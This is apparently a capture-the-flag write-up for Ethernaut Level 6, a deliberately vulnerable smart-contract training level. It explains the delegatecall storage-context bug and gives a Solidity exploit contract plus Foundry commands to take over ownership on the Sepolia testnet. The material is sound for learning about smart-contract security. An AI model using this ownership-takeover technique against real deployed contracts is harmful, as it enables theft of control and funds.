# Ethernaut Level 6: Delegation Exploit Validation
# Target: Delegate call vulnerability allowing ownership takeover

**Level:** 6 - Delegation  
**Contract:** `Delegation.sol` / `Delegate.sol`  
**Vulnerability:** `delegatecall` preserves `msg.sender` and `msg.value`, allowing caller context manipulation

---

## 🔍 Vulnerability Analysis

```solidity
// Delegate.sol - The implementation contract
contract Delegate {
    address public owner;
    
    function pwn() public {
        owner = msg.sender;  // Sets owner to CALLER in CURRENT context
    }
}

// Delegation.sol - The proxy contract  
contract Delegation {
    address public owner;
    Delegate delegate;
    
    fallback() external {
        // DELEGATECALL: runs Delegate code in Delegation context!
        (bool result,) = address(delegate).delegatecall(msg.data);
    }
}
```

**The Bug:** `delegatecall` executes the target contract's code in the CALLER's storage context. When we call `Delegation.fallback()` with `Delegate.pwn()` calldata, the `pwn()` function executes in `Delegation`'s storage context, setting `Delegation.owner = msg.sender`.

---

## 🎯 Exploit Strategy

1. **Calculate function signature:** `keccak256("pwn()")` = `0xdd365b8b`
2. **Send low-level call** to Delegation contract with `pwn()` calldata
3. **Trigger fallback** → `delegatecall` executes `pwn()` in Delegation context
4. **Claim ownership** → `Delegation.owner` becomes our address

---

## ⚡ Exploit Implementation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDelegation {
    function owner() external view returns (address);
}

contract DelegationExploit {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function exploit() external {
        // Calculate pwn() function selector
        bytes memory payload = abi.encodeWithSignature("pwn()");
        
        // Low-level call triggers fallback, which delegatecalls to Delegate.pwn()
        (bool success,) = target.call(payload);
        require(success, "Exploit failed");
        
        // Verify ownership
        address newOwner = IDelegation(target).owner();
        require(newOwner == address(this), "Ownership not transferred");
    }
}
```

---

## 🧪 Testnet Execution (Sepolia)

**Pre-flight:**
```bash
# Get test ETH from Sepolia faucet
# Target contract address: TBD from Ethernaut instance
export TARGET="0x..."  # Instance address
export PRIVATE_KEY="..."  # Test wallet (no real funds!)
```

**Execution via Foundry:**
```bash
# Deploy exploit contract
forge create DelegationExploit \
  --constructor-args $TARGET \
  --rpc-url https://rpc.sepolia.org \
  --private-key $PRIVATE_KEY

# Call exploit function
cast send $EXPLOIT_CONTRACT "exploit()" \
  --rpc-url https://rpc.sepolia.org \
  --private-key $PRIVATE_KEY

# Verify ownership
cast call $TARGET "owner()" --rpc-url https://rpc.sepolia.org
```

---

## 📊 Validation Results

| Check | Status | Notes |
|-------|--------|-------|
| Vulnerability identified | ✅ Confirmed | `delegatecall` context confusion |
| Exploit path mapped | ✅ Confirmed | Low-level call with `pwn()` selector |
| Code compiles | ⏳ Pending | Testnet execution needed |
| Ownership takeover | ⏳ Pending | Verify on-chain |
| Instance submit | ⏳ Pending | Ethernaut validation |

---

## 🎓 Key Learnings

**Delegatecall dangers:**
- Preserves `msg.sender` and `msg.value` from original call
- Executes in caller's storage context (proxy pattern!)
- Common in upgradeable contracts → also common attack vector

**Real-world parallel:**
- Parity Multisig hack (2017): $30M lost to delegatecall misuse
- Always validate target address and calldata in proxy patterns

---

## 📝 Execution Log

**2026-02-01 10:07Z** - Validation script created, ready for testnet execution

**Next:** Deploy to Sepolia and execute exploit when testnet funds available
